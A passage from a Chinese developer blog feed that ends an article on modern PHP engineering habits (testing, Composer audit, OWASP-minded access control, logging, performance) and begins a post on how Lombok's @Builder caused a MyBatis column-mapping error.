    <span class="hljs-title function_ invoke__">expect</span>(fn() =&gt; <span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">apply</span>(<span class="hljs-number">1000</span>, -<span class="hljs-number">1</span>))-&gt;<span class="hljs-title function_ invoke__">toThrow</span>(<span class="hljs-title class_">InvalidArgumentException</span>::<span class="hljs-variable language_">class</span>);
    <span class="hljs-title function_ invoke__">expect</span>(fn() =&gt; <span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">apply</span>(<span class="hljs-number">1000</span>, <span class="hljs-number">101</span>))-&gt;<span class="hljs-title function_ invoke__">toThrow</span>(<span class="hljs-title class_">InvalidArgumentException</span>::<span class="hljs-variable language_">class</span>);
});
</code></pre>
<h4 data-id="heading-16">习惯中的习惯：把计算和 IO 分开</h4>
<p>业务逻辑和数据库调用、HTTP 调用混在一起，测试就变得困难且缓慢——所以人们不写了。</p>
<p>进阶做法是为计算写纯函数/服务，把 IO 放在接口后面。这不是"企业架构"，是可测试性。</p>
<p><strong>为什么这个习惯有用：</strong></p>
<p>学会为正确性和可维护性设计，而不只是"让端点工作"。</p>
<h3 data-id="heading-17">习惯 7：把依赖卫生变成不可协商的构建步骤</h3>
<p>Composer 的 <code>audit</code> 命令是最简单的胜利之一。Composer 文档说得很清楚，audit 会根据公告检查已安装的包（默认用 Packagist），用退出代码检测废弃的包，可以在 CI 中用。</p>
<h4 data-id="heading-18">在 CI 中添加（别指望"有人会运行"）</h4>
<pre><code class="hljs language-bash" lang="bash">composer install --no-interaction --no-progress --prefer-dist
composer audit --format=summary
</code></pre>
<h4 data-id="heading-19">用 Composer 脚本变成开发者习惯</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"check"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"composer validate --no-interaction"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"composer audit --format=summary"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"vendor/bin/phpstan analyse --memory-limit=1G"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"vendor/bin/phpunit"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>现在开发者运行：</p>
<pre><code class="hljs language-bash" lang="bash">composer check
</code></pre>
<p>一个命令，一致的结果。</p>
<p><strong>为什么这个习惯有用：</strong></p>
<p>把供应链风险当作工程质量的一部分，而不是"稍后安全部门的事"。</p>
<h3 data-id="heading-20">习惯 8：把 OWASP 当思维模型，别当合规清单</h3>
<p>OWASP Top 10 是面向开发者的意识基线。OWASP 指出，最新版本是 OWASP Top 10:2026。</p>
<p>访问控制失效仍是主要风险（2021 年是 A01，2026 年还是 A01）。</p>
<p><strong>换句话说：</strong> 授权错误仍是出事故最快的方式之一。</p>
<h4 data-id="heading-21">每周习惯：找一类访问控制 bug 并消除</h4>
<p>常见模式：按 ID 取记录，不限定到已认证用户/租户。</p>
<p><strong>糟糕的模式：</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$order</span> = <span class="hljs-variable">$repo</span>-&gt;<span class="hljs-title function_ invoke__">findById</span>((<span class="hljs-keyword">int</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'orderId'</span>]);
</code></pre>
<p><strong>更好：</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$userId</span> = <span class="hljs-variable">$auth</span>-&gt;<span class="hljs-title function_ invoke__">userId</span>();
<span class="hljs-variable">$orderId</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'orderId'</span>];
<span class="hljs-variable">$order</span> = <span class="hljs-variable">$repo</span>-&gt;<span class="hljs-title function_ invoke__">findForUser</span>(<span class="hljs-variable">$orderId</span>, <span class="hljs-variable">$userId</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$order</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">404</span>);
    <span class="hljs-keyword">exit</span>;
}
</code></pre>
<h4 data-id="heading-22">另一个高影响习惯：到处用预处理语句</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">'SELECT * FROM users WHERE email = :email'</span>);
<span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-string">'email'</span> =&gt; <span class="hljs-variable">$email</span>]);
<span class="hljs-variable">$user</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();
</code></pre>
<p>不用记住每个 OWASP 类别，把它当覆盖地图用：</p>
<ul>
<li>访问控制</li>
<li>输入处理</li>
<li>配置错误</li>
<li>供应链故障</li>
</ul>
<p><strong>为什么这个习惯有用：</strong></p>
<p>把安全本能直接构建到实现决策里。</p>
<h3 data-id="heading-23">习惯 9：把可观测性当代码特性，别只当基础设施</h3>
<p>大多数工程师只在出问题后才关心日志，这是倒着来的。</p>
<p>进阶习惯是给重要代码路径加仪表：</p>
<ul>
<li>认证事件</li>
<li>支付状态转换</li>
<li>外部 API 调用</li>
<li>重试和回退</li>
<li>"不可能"的分支</li>
</ul>
<h4 data-id="heading-24">最小的结构化日志模式（PSR-3 风格）</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$logger</span>-&gt;<span class="hljs-title function_ invoke__">info</span>(<span class="hljs-string">'payment.authorize.started'</span>, [
    <span class="hljs-string">'order_id'</span> =&gt; <span class="hljs-variable">$orderId</span>,
    <span class="hljs-string">'provider'</span> =&gt; <span class="hljs-string">'stripe'</span>,
    <span class="hljs-string">'idempotency_key'</span> =&gt; <span class="hljs-variable">$key</span>,
]);

<span class="hljs-keyword">try</span> {
    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$gateway</span>-&gt;<span class="hljs-title function_ invoke__">authorize</span>(<span class="hljs-variable">$command</span>);
    <span class="hljs-variable">$logger</span>-&gt;<span class="hljs-title function_ invoke__">info</span>(<span class="hljs-string">'payment.authorize.ok'</span>, [
        <span class="hljs-string">'order_id'</span> =&gt; <span class="hljs-variable">$orderId</span>,
        <span class="hljs-string">'provider_ref'</span> =&gt; <span class="hljs-variable">$res</span>-&gt;reference,
    ]);
} <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span>) {
    <span class="hljs-variable">$logger</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">'payment.authorize.failed'</span>, [
        <span class="hljs-string">'order_id'</span> =&gt; <span class="hljs-variable">$orderId</span>,
        <span class="hljs-string">'error'</span> =&gt; <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>(),
        <span class="hljs-string">'exception'</span> =&gt; <span class="hljs-variable">$e</span>::<span class="hljs-variable language_">class</span>,
    ]);
    <span class="hljs-keyword">throw</span> <span class="hljs-variable">$e</span>;
}
</code></pre>
<h4 data-id="heading-25">事故时有回报的习惯：关联 ID</h4>
<ul>
<li>传入请求有关联 ID 头就重用</li>
<li>没有就生成一个</li>
<li>放在该请求的每个日志行里</li>
</ul>
<p>把"我们有日志"变成"我们能追踪单个用户操作"。</p>
<p><strong>为什么这个习惯有用：</strong></p>
<p>减少平均理解时间（MTTU），不只是平均恢复时间。</p>
<h3 data-id="heading-26">习惯 10：性能工作从测量开始，别猜</h3>
<p>PHP 中性能问题通常来自：</p>
<ul>
<li>N+1 数据库查询</li>
<li>大量序列化/反序列化</li>
<li>对大数据集的无界循环</li>
<li>昂贵代码路径中缺少缓存</li>
</ul>
<p>高影响习惯是每周选一个端点做"性能阅读"：</p>
<ul>
<li>它运行多少查询？</li>
<li>响应有多大？</li>
<li>p95 延迟是多少？</li>
<li>在并发下会发生什么？</li>
</ul>
<h4 data-id="heading-27">实用的微优化习惯：消除可避免的分配</h4>
<p>处理大数据时，生成器能减少内存压力：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@return</span> Generator&lt;int, array{sku: string, qty: int}&gt;
 */</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">streamItems</span>(<span class="hljs-params"><span class="hljs-keyword">iterable</span> <span class="hljs-variable">$rows</span></span>): <span class="hljs-title">Generator</span>
</span>{
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$rows</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>) {
        <span class="hljs-keyword">yield</span> [
            <span class="hljs-string">'sku'</span> =&gt; (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$row</span>[<span class="hljs-string">'sku'</span>],
            <span class="hljs-string">'qty'</span> =&gt; (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$row</span>[<span class="hljs-string">'qty'</span>],
        ];
    }
}
</code></pre>
<p>别混淆微优化和真正的胜利。真正的胜利通常是查询塑形和缓存。</p>
<p><strong>为什么这个习惯有用：</strong></p>
<p>学会把代码决策和生产行为（延迟、吞吐量、成本）联系起来。</p>
<h3 data-id="heading-28">习惯 11：建立复利的个人工程循环</h3>
<p>强大的开发者不靠情绪，靠循环：</p>
<ol>
<li>改点小东西</li>
<li>快速拿到反馈</li>
<li>重复</li>
</ol>
<p>2026 年对 PHP 效果好的循环：</p>
<ul>
<li><strong>编码前：</strong> 定义输入/输出形状（DTO、枚举、值对象）</li>
<li><strong>编码时：</strong> 保持函数小，清晰命名转换（管道有帮助）</li>
<li><strong>推送前：</strong> 运行 <code>composer check</code>（audit + 静态分析 + 测试）</li>
<li><strong>审查中：</strong> 找不变量、边界、访问控制和"安静的复杂性"</li>
<li><strong>发布后：</strong> 在风险更改的地方加日志/指标</li>
</ul>
<p>这不是仪式，是发布经得起时间考验的代码的方式。</p>
<h3 data-id="heading-29">30 天提升 PHP 水平的计划</h3>
<p>想要能实际执行的，这样做：</p>
<h4 data-id="heading-30">第 1 周：现代工具基线</h4>
<ul>
<li>CI 中加 <code>composer audit</code></li>
<li>加 PHPStan 在适度级别并让它通过</li>
<li>加 <code>composer check</code> 脚本用于本地运行</li>
</ul>
<h4 data-id="heading-31">第 2 周：数据边界和不变量</h4>
<ul>
<li>给 2-3 个关键端点引入 DTO 边界</li>
<li>在一个模块里用枚举替换字符串状态字段</li>
<li>在构造函数或属性钩子里加不变量</li>
</ul>
<h4 data-id="heading-32">第 3 周：重要的测试</h4>
<ul>
<li>给金钱/舍入/折扣或其他"业务核心"加测试</li>
<li>运行时允许的话，转向现代测试基线（PHPUnit 11 / Pest）</li>
</ul>
<h4 data-id="heading-33">第 4 周：安全和生产反馈</h4>
<ul>
<li>给顶级敏感资源审计访问控制（OWASP A01 思维）</li>
<li>给风险流程加关联 ID + 结构化日志</li>
<li>选一个端点减少查询数量或有效负载大小</li>
</ul>
<p>月底会注意到复利效应：更少回归，更快审查，更清晰重构。</p>
<h3 data-id="heading-34">结论</h3>
<p>现代 PHP（8.4 和 8.5）提供了减少样板、提高表达力的工具——属性钩子、非对称可见性、管道操作符等。</p>
<p>但这些工具只有在习惯创建的系统中才重要：</p>
<ul>
<li>输入尽早变成类型化数据</li>
<li>不变量靠近状态</li>
<li>分析和测试持续运行</li>
<li>依赖自动审计</li>
<li>安全思维是实现的一部分</li>
<li>生产反馈在日志和指标里可见</li>
</ul>
<p>真实团队里的"进阶"就是这样：不是英雄式重构，而是无聊的习惯，复利到代码库变得更容易改变而不是破坏。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MyBatis 映射值报错的罪魁祸首竟然是 Lombok 的 @Builder？]]></title>    <link>https://juejin.cn/post/7589903499598938166</link>    <guid>https://juejin.cn/post/7589903499598938166</guid>    <pubDate>2026-01-01T01:17:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589903499598938166" data-draft-id="7589903499598889014" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MyBatis 映射值报错的罪魁祸首竟然是 Lombok 的 @Builder？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-01T01:17:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="javadaydayup"/> <meta itemprop="url" content="https://juejin.cn/user/2436173497635703"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MyBatis 映射值报错的罪魁祸首竟然是 Lombok 的 @Builder？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173497635703/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    javadaydayup
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T01:17:15.000Z" title="Thu Jan 01 2026 01:17:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">问题现象</h2>
<p>最近遇到一个问题，当 mybatis 的 mapper.xml 文件中使用来映射的对象使用了 lombok 中的 <code>@Builder</code> 注解修饰后，发生了字段值映射错位的问题，而当去掉 <code>@Builder</code> 注解之后字段映射值又正常了。</p>
<h2 data-id="heading-1">问题复现</h2>
<p>为了复现这个问题，搞了一个 demo 代码。首先定义了一个 <code>user</code> 表，假设它里面只有 <code>id</code>, <code>name</code>, <code>update_time</code> 这三个字段，其中 <code>name</code> 是 <code>varchar</code> 类型， <code>update_time</code> 是 <code>timestamp</code> 类型。表的定义如下：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">user</span> (  
    id <span class="hljs-type">BIGINT</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,  
    name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">30</span>) <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> ,  
    update_time <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,  
    <span class="hljs-keyword">PRIMARY</span> KEY (id)  
);
</code></pre>
<p>然后定义了一个 <code>User</code> 类，它里面定义了 <code>updateTime</code>, <code>name</code> 字段，且 <code>updateTime</code> 字段的顺序在 <code>name</code> 注解前面，同时使用了 lombok 中的 <code>@Builder</code> 注解修饰。代码如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Builder</span>  
<span class="hljs-meta">@Data</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {  
    <span class="hljs-keyword">private</span> Date updateTime;  
    <span class="hljs-keyword">private</span> String name;  
}
</code></pre>
<p>然后 mapper.xml 文件中定义了一个查询所有用户的语句，在这个语句中 <code>select</code> 的时候，<strong><code>name</code> 字段的顺序在 <code>update_time</code> 前面</strong>，这点很重要，使用的 MyBatis 版本是 3.5.10。Xml 文件定义如下：</p>
<pre><code class="hljs language-java" lang="java">&lt;mapper namespace=<span class="hljs-string">"com.mapper.UserMapper"</span>&gt;  
    &lt;resultMap id=<span class="hljs-string">"userMap"</span> type=<span class="hljs-string">"com.entity.User"</span>&gt;  
	    &lt;result property=<span class="hljs-string">"name"</span> column=<span class="hljs-string">"name"</span>/&gt;  
	    &lt;result property=<span class="hljs-string">"updateTime"</span> column=<span class="hljs-string">"update_time"</span>/&gt;  
	&lt;/resultMap&gt;  
	&lt;select id=<span class="hljs-string">"listAll"</span> resultMap=<span class="hljs-string">"userMap"</span>&gt;  
	    select name, update_time  
	    from user  
	&lt;/select&gt;  
&lt;/mapper&gt;
</code></pre>
<p>在数据库初始化的时候往 user 表里面插入了一条数据。SQL 如下：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">user</span> (id, name) <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">'Jone'</span>);
</code></pre>
<p>执行查询后接口直接报错了，从报错看是尝试把  Jone 这个字符串转为 <code>Timestamp</code> 类型从而报错了，实际报错是在 <code>DateTyperHanlder</code> 的 <code>getNullableResult()</code> 方法里面触发的。如下图所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59dc7fdef40f4d1597bdf2a63be23c22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgamF2YWRheWRheXVw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767835035&amp;x-signature=%2Fa%2BydVdKdk5xr32Ya6W72%2B1mq4I%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a173675d6aa6489585a1bfecae73ee05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgamF2YWRheWRheXVw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767835035&amp;x-signature=iy5HvBRGvS1jXt5hT%2Bp93VCT7%2FY%3D" alt="image.png" loading="lazy"/></p>
